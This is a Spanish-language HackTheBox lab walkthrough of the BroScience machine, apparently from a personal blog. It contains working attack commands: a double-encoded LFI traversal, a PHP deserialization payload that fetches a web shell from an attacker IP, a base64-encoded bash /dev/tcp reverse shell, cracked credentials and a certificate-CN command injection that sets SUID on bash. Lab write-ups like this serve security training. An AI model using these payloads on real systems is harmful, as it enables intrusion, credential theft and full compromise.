+++ 
draft = false
date = 2026-06-05T19:58:38Z
title = "Broscience Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux #LFI #InsecureDeserialization #PostgreSQL #SaltedHashes
----------------

# Introducción

BroScience es una máquina Linux de dificultad media centrada en la explotación de vulnerabilidades web. La intrusión comienza mediante un Local File Inclusion (LFI) que permite acceder al código fuente de la aplicación y descubrir un mecanismo inseguro de generación de códigos de activación. Posteriormente, una vulnerabilidad de deserialización insegura permite obtener ejecución remota de comandos sobre el servidor. Tras acceder al sistema, se recuperan credenciales reutilizadas desde la base de datos y, finalmente, una inyección de comandos en un script de renovación de certificados ejecutado por `root` conduce al compromiso total de la máquina.
# Enumeración Nmap

Realizamos un escaneo completo de puertos en busca de servicios expuestos:

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.129.228.129 -oG allPorts
```

Obteniendo los siguientes puertos abiertos:

<img src="/images/Pasted image 20260604174047.png" style="width:100%; height:auto; display:block; margin:auto;">

A continuación, realizamos un escaneo de versiones y scripts sobre los puertos identificados:

```bash
nmap -p22,80,512,513,514 -sCV 10.129.228.129 -oN portServices
```

<img src="/images/Pasted image 20260604174155.png" style="width:100%; height:auto; display:block; margin:auto;">

Durante la enumeración se identifica el dominio `broscience.htb`, asociado al servicio web. Por ello, añadimos la entrada correspondiente en nuestro archivo `/etc/hosts`.

<img src="/images/Pasted image 20260604174319.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración HTTP

Comenzamos la enumeración del servicio web. Al acceder a la aplicación observamos la siguiente página:

<img src="/images/Pasted image 20260604174348.png" style="width:100%; height:auto; display:block; margin:auto;">

La aplicación dispone de una funcionalidad de inicio de sesión.

<img src="/images/Pasted image 20260604174641.png" style="width:100%; height:auto; display:block; margin:auto;">

Además, permite el registro de nuevos usuarios y ofrece funcionalidades adicionales.

<img src="/images/Pasted image 20260604174657.png" style="width:100%; height:auto; display:block; margin:auto;">

Analizando la estructura de la aplicación mediante `Burp Suite`, destaca especialmente el directorio `includes`.

<img src="/images/Pasted image 20260604174623.png" style="width:100%; height:auto; display:block; margin:auto;">

El servidor web permite el listado de directorios en la ruta `/includes/`, exponiendo archivos internos como `db_connect.php`, `utils.php` y otros. Esta información facilita la enumeración de la aplicación y puede ayudar a identificar vectores de ataque adicionales.

<img src="/images/Pasted image 20260604175123.png" style="width:100%; height:auto; display:block; margin:auto;">

Aunque los archivos PHP no exponen su código fuente debido a que son interpretados por el servidor, el archivo `img.php` genera mensajes de error que revelan información interna de la aplicación. Entre los datos filtrados se encuentra el parámetro `path`, utilizado por el script para procesar solicitudes.

Esta divulgación de información puede resultar útil para identificar vulnerabilidades adicionales.

<img src="/images/Pasted image 20260604175345.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotando LFI

Si realizamos la siguiente petición, la aplicación detecta el intento de acceso a archivos arbitrarios mediante un ataque de `LFI`:

```bash
curl -s -k "https://broscience.htb/includes/img.php?path=/etc/passwd"
```

<img src="/images/Pasted image 20260604182606.png" style="width:100%; height:auto; display:block; margin:auto;">

Para evadir esta validación, aplicamos una doble codificación URL (`double URL encoding`) a la ruta solicitada:

```bash
curl -s -k "https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34"
```

La técnica resulta efectiva, permitiendo la lectura arbitraria de archivos del sistema.

<img src="/images/Pasted image 20260604182753.png" style="width:100%; height:auto; display:block; margin:auto;">

Aprovechando esta vulnerabilidad, descargamos el archivo `utils.php` para analizar su código fuente:

```bash
curl -s -k "https://broscience.htb/includes/img.php?path=%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%37%35%25%37%34%25%36%39%25%36%63%25%37%33%25%32%65%25%37%30%25%36%38%25%37%30" -o includes.php
```

# Generando código de activación

<img src="/images/Pasted image 20260604185237.png" style="width:100%; height:auto; display:block; margin:auto;">

Tras revisar el código fuente, se identificó que los códigos de activación son generados mediante la función `generate_activation_code()`, la cual utiliza `rand()` para seleccionar 32 caracteres de forma pseudoaleatoria. Además, el generador es inicializado mediante `srand(time())`, utilizando como semilla la marca temporal actual del servidor.

Debido a que la semilla depende únicamente del tiempo, es posible reproducir el proceso de generación si se conoce o se puede estimar el instante exacto en el que fue creado el código. Para validar esta hipótesis, se desarrolló un script en PHP que replica la lógica de la aplicación, utilizando como semilla el valor de la cabecera HTTP `Date` devuelta por el servidor.

```php
php -r 'function generate_activation_code() {              
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
$timestamp = strtotime("Thu, 04 Jun 2026 23:10:14 GMT");
echo "Timestamp: $timestamp\n";
srand($timestamp);
echo "Código: " . generate_activation_code() . "\n";'
```

Con esta información, registramos una nueva cuenta para estimar el instante exacto de generación del código de activación.

Enviamos la siguiente petición:

<img src="/images/Pasted image 20260604191651.png" style="width:100%; height:auto; display:block; margin:auto;">

La respuesta del servidor indica que la cuenta ha sido creada correctamente e incluye la cabecera:

```text
Date: Thu, 04 Jun 2026 23:16:32 GMT
```

<img src="/images/Pasted image 20260604191732.png" style="width:100%; height:auto; display:block; margin:auto;">

Utilizando esta marca temporal como semilla, reproducimos localmente el algoritmo y obtenemos el siguiente código de activación para la cuenta recién creada:

<img src="/images/Pasted image 20260604191844.png" style="width:100%; height:auto; display:block; margin:auto;">

Finalmente, enviamos el código generado al endpoint de activación:

```bash
https://broscience.htb/activate.php?code=9R9DnjtpJLFdJ8QabMK4K2eRJ01eBvXD
```

La activación se completa correctamente.

<img src="/images/Pasted image 20260604192014.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotación de Deserialización Insegura

Tras iniciar sesión, la aplicación establece dos cookies. La más interesante es `user-prefs`.

<img src="/images/Pasted image 20260604203013.png" style="width:100%; height:auto; display:block; margin:auto;">

Si recordamos el código presente en `utils.php`, la función `get_theme()` deserializa el contenido de la cookie `user-prefs` mediante `unserialize()`:

```php
$up = unserialize(base64_decode($up_cookie));
```

Dado que el valor de esta cookie es completamente controlado por el usuario, un atacante puede suministrar objetos PHP arbitrarios durante el proceso de deserialización, dando lugar a una vulnerabilidad de **PHP Object Injection**.

Además, el archivo define la clase `AvatarInterface`:

```php
class AvatarInterface {
    public $tmp;
    public $imgPath;
    
    public function __wakeup() {        
	    $a = new Avatar($this->imgPath);
        $a->save($this->tmp);    
   }
}
```

Cuando un objeto de esta clase es deserializado, PHP ejecuta automáticamente el método mágico `__wakeup()`, el cual invoca la función `save()` de la clase `Avatar`. Debido a que ambas propiedades pueden ser controladas por el atacante, es posible influir directamente en el comportamiento de dicho método.

Esto convierte a `AvatarInterface` en un gadget válido dentro de una cadena de explotación de deserialización insegura.

Para explotar la vulnerabilidad, creamos una instancia de la clase `AvatarInterface` y configuramos manualmente sus propiedades:

```php
$obj = new AvatarInterface();
$obj->tmp = "http://10.10.14.146:8000/shell.php";
$obj->imgPath = "/var/www/html/shell.php";
```

Posteriormente, serializamos el objeto y codificamos el resultado en Base64 para obtener un valor apto para ser enviado en la cookie `user-prefs`:

```php
echo base64_encode(serialize($obj));
```

Cuando la aplicación procesa la cookie y ejecuta `unserialize()`, PHP reconstruye el objeto `AvatarInterface` y ejecuta automáticamente su método mágico `__wakeup()`. Como consecuencia, se invoca la función `save()` utilizando valores completamente controlados por el atacante, desencadenando la acción definida por la cadena de deserialización.

El script completo y su resultado se muestran a continuación:

<img src="/images/Pasted image 20260604203550.png" style="width:100%; height:auto; display:block; margin:auto;">

A continuación, alojamos una web shell en nuestro equipo atacante con el nombre `shell.php`:

<img src="/images/Pasted image 20260604203626.png" style="width:100%; height:auto; display:block; margin:auto;">

Posteriormente, iniciamos un servidor HTTP para que el sistema objetivo pueda descargar el archivo remoto.

<img src="/images/Pasted image 20260604203803.png" style="width:100%; height:auto; display:block; margin:auto;">

Después, sustituimos el valor de la cookie `user-prefs` por la cadena serializada maliciosa:

<img src="/images/Pasted image 20260604203706.png" style="width:100%; height:auto; display:block; margin:auto;">

Tras recargar la página, el servidor realiza una petición hacia nuestro equipo atacante.

<img src="/images/Pasted image 20260604203825.png" style="width:100%; height:auto; display:block; margin:auto;">

Finalmente, accedemos al archivo generado en el servidor web:

```bash
curl -s -k "https://broscience.htb/shell.php?0=ls"
```

Confirmando la obtención de ejecución remota de comandos (RCE):

<img src="/images/Pasted image 20260604203918.png" style="width:100%; height:auto; display:block; margin:auto;">

Para obtener una shell interactiva, nos ponemos en escucha con `penelope` en el puerto `4455`:

```bash
penelope -p 4455
```

<img src="/images/Pasted image 20260604204913.png" style="width:100%; height:auto; display:block; margin:auto;">

A continuación, ejecutamos el siguiente comando a través de la web shell para obtener una reverse shell:

```bash
curl -s -k "https://broscience.htb/shell.php?0=printf+KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQ2LzQ0NTUgMD4mMSkgJg==|base64+-d|bash"
```

Como resultado, obtenemos una shell interactiva como el usuario `www-data`.

<img src="/images/Pasted image 20260604205005.png" style="width:100%; height:auto; display:block; margin:auto;">

# Movimiento lateral

Al revisar el archivo `/var/www/html/includes/db_connect.php`, encontramos información sensible, incluyendo credenciales de acceso a la base de datos y el valor de la `salt` utilizada por la aplicación.

<img src="/images/Pasted image 20260604210730.png" style="width:100%; height:auto; display:block; margin:auto;">

Con esta información podemos conectarnos a la base de datos PostgreSQL mediante las credenciales recuperadas:

```bash
psql -h localhost -p 5432 --username=dbuser -W broscience
```

<img src="/images/Pasted image 20260604211228.png" style="width:100%; height:auto; display:block; margin:auto;">

Una vez dentro de la base de datos, podemos listar las tablas existentes utilizando el siguiente comando:

```psql
\dt
```

<img src="/images/Pasted image 20260604211528.png" style="width:100%; height:auto; display:block; margin:auto;">

Entre las tablas identificadas destaca `users`, por lo que procedemos a examinar su estructura:

```bash
\d users
```

Observamos que contiene, entre otras, las columnas `username` y `password`.

<img src="/images/Pasted image 20260604211545.png" style="width:100%; height:auto; display:block; margin:auto;">

Para recuperar los datos almacenados en dichas columnas ejecutamos la siguiente consulta:

```psql
select username,password from users;
```

<img src="/images/Pasted image 20260604211651.png" style="width:100%; height:auto; display:block; margin:auto;">

La consulta devuelve los hashes de las contraseñas de los usuarios registrados. Exportamos esta información a nuestra máquina local para intentar descifrarlos, teniendo en cuenta que la aplicación utiliza la `salt`:

```text
NaCl
```

Para que `John` interprete correctamente el formato utilizado por la aplicación, almacenamos los hashes con la siguiente estructura:

```text
usuario:$dynamic_4$hash_en_md5$salt
```

El archivo final queda de la siguiente manera:

<img src="/images/Pasted image 20260604212334.png" style="width:100%; height:auto; display:block; margin:auto;">

A continuación, ejecutamos `John the Ripper` utilizando el formato adecuado:

```bash
john --format=dynamic_4 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Obteniendo las contraseñas de tres usuarios:

<img src="/images/Pasted image 20260604212412.png" style="width:100%; height:auto; display:block; margin:auto;">

Al enumerar los usuarios existentes en el sistema observamos que existe la cuenta `bill`.

<img src="/images/Pasted image 20260604212455.png" style="width:100%; height:auto; display:block; margin:auto;">

Probamos las credenciales recuperadas mediante `SSH`:

```text
bill : iluvhorsesandgym
```

```bash
ssh bill@broscience.htb
```

La autenticación es exitosa y obtenemos acceso al sistema como el usuario `bill`.

<img src="/images/Pasted image 20260604212621.png" style="width:100%; height:auto; display:block; margin:auto;">

Con acceso a la cuenta de `bill`, ya es posible recuperar la flag de usuario:

<img src="/images/Pasted image 20260604213706.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Utilizamos `pspy` para monitorizar los procesos ejecutados en la máquina objetivo.

Tras observar el sistema durante algunos minutos, identificamos un proceso que se ejecuta periódicamente:

<img src="/images/Pasted image 20260605150409.png" style="width:100%; height:auto; display:block; margin:auto;">

El comando ejecutado es el siguiente:

```bash
/bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt
```

Analizando el contenido de `renew_cert.sh`, encontramos el siguiente código:

```bash
!/bin/bash                                                                                                          
if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then                                                    
    echo "Usage: $0 certificate.crt";                     
    exit 0;                 
fi                                                                 
                                                          
if [ -f $1 ]; then                                                                                                                     
                                                          
    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
                                                          
    if [ $? -eq 0 ]; then                         
        echo "No need to renew yet.";                              
        exit 1;                                                                                                      
    fi                                                             
                                                          
    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)                                                                   
                                                          
    country=$(echo $subject | grep -Eo 'C = .{2}')    
    state=$(echo $subject | grep -Eo 'ST = .*,')                                                                     
    locality=$(echo $subject | grep -Eo 'L = .*,')                 
    organization=$(echo $subject | grep -Eo 'O = .*,')                                                                                 
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')  
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')    
    emailAddress=$(openssl x509 -in $1 -noout -email)
                                                          
    country=${country:4}                                                                                             
    state=$(echo ${state:5} | awk -F, '{print $1}')                                                                  
    locality=$(echo ${locality:3} | awk -F, '{print $1}')                                                            
    organization=$(echo ${organization:4} | awk -F, '{print $1}')  
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')                                                              
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
                                                          
    echo $subject;                                        
    echo "";                              
    echo "Country     => $country";                                                                                                    
    echo "State       => $state";           
    echo "Locality    => $locality";  
    echo "Org Name    => $organization";
    echo "Org Unit    => $organizationUnit";                       
    echo "Common Name => $commonName";    
    echo "Email       => $emailAddress";                                                                             
                                                          
    echo -e "\nGenerating certificate...";                
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country                  
    $state           
    $locality                                                      
    $organization                                                  
    $organizationUnit                                              
    $commonName                                                    
    $emailAddress                                                  
    " 2>/dev/null                                                  

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"                                                                   
else                                                               
    echo "File doesn't exist"                                      
    exit 1;
```

El script valida inicialmente que se haya proporcionado un único argumento correspondiente a un certificado. Posteriormente, comprueba que el archivo exista y verifica si expirará durante las próximas 24 horas.

Si el certificado continúa siendo válido por más de 24 horas, el script finaliza sin realizar ninguna acción.

Cuando el certificado está próximo a expirar, se extrae su campo *Subject*, que contiene información similar a la siguiente:

```bash
subject=C = US, ST = Texas, L = Austin, O = BroScience, OU = IT, CN = broscience.htb
```

A continuación, el script obtiene cada uno de los campos (`C`, `ST`, `L`, `O`, `OU` y `CN`) y los reutiliza para generar un nuevo certificado autofirmado. Finalmente, dicho certificado es almacenado temporalmente en `/tmp/temp.crt` y movido al directorio `/home/bill/Certs`.

La línea vulnerable es la siguiente:

```bash
/bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
```

El valor de `$commonName` proviene directamente del certificado proporcionado por el usuario. Debido a que este valor es interpolado dentro de un comando ejecutado mediante `bash -c`, sin ningún mecanismo de sanitización o escapado, es posible inyectar comandos arbitrarios a través del campo `CN`.

Dado que el script es ejecutado por `root`, cualquier comando inyectado se ejecutará con privilegios elevados, permitiendo una escalada de privilegios.

## Generando un certificado malicioso

El certificado procesado periódicamente por el script corresponde a:

```text
/home/bill/Certs/broscience.crt
```

<img src="/images/Pasted image 20260605152843.png" style="width:100%; height:auto; display:block; margin:auto;">

Como el usuario `bill` posee permisos de escritura sobre dicho directorio, podemos reemplazar el certificado legítimo por uno controlado por nosotros:

```bash
openssl req -x509 -sha256 -nodes -days 1 -newkey rsa:4096 -keyout /dev/null -out broscience.crt
```

El campo relevante para la explotación es `Common Name (CN)`. Por tanto, introducimos nuestra carga útil en dicho campo. En este caso utilizaremos:

```bash
chmod u+s /bin/bash
```

<img src="/images/Pasted image 20260605153202.png" style="width:100%; height:auto; display:block; margin:auto;">

Una vez reemplazado el certificado, únicamente debemos esperar a que la tarea programada ejecutada por `root` procese el archivo.

Después de unos instantes, verificamos que el bit SUID ha sido establecido correctamente:

<img src="/images/Pasted image 20260605153252.png" style="width:100%; height:auto; display:block; margin:auto;">

Finalmente, obtenemos una shell con privilegios de `root` ejecutando:

```bash
bash -p
```

Con ello obtenemos acceso completo al sistema y podemos recuperar la flag `root.txt`.

<img src="/images/Pasted image 20260605153339.png" style="width:100%; height:auto; display:block; margin:auto;">

# Conclusión

La explotación de BroScience se basa en una cadena de vulnerabilidades que incluye un Local File Inclusion para obtener información sensible, la predicción de códigos de activación generados de forma insegura, una vulnerabilidad de deserialización insegura que conduce a ejecución remota de comandos y la reutilización de credenciales almacenadas en la base de datos. Finalmente, una inyección de comandos en un script ejecutado por `root` permite escalar privilegios y comprometer completamente el sistema.
